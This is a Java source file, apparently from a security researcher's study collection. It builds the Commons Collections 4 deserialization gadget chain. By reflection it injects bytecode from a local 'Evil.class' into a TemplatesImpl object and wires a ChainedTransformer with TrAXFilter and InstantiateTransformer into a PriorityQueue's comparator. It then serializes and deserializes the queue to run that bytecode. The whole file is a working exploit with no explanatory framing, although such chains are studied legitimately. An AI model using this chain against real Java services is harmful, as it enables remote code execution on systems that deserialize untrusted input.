package com.rain;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();
        Field nameField = aClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"abc");
        Field tfactoryField = aClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
        byte[] evil = Files.readAllBytes(Paths.get("/Users/long/Documents/github_doc/security_db/Java_relevant/code/gadget/CC_chains/src/main/java/Evil.class"));
        byte[][] code={ evil };
        Field bytecodesField = aClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,code);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer =new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class<TransformingComparator> transformingComparatorClass = TransformingComparator.class;
        Field transformerField = transformingComparatorClass.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator,chainedTransformer);

        Utils.serialize(priorityQueue);
        Utils.deserialize();

    }
}
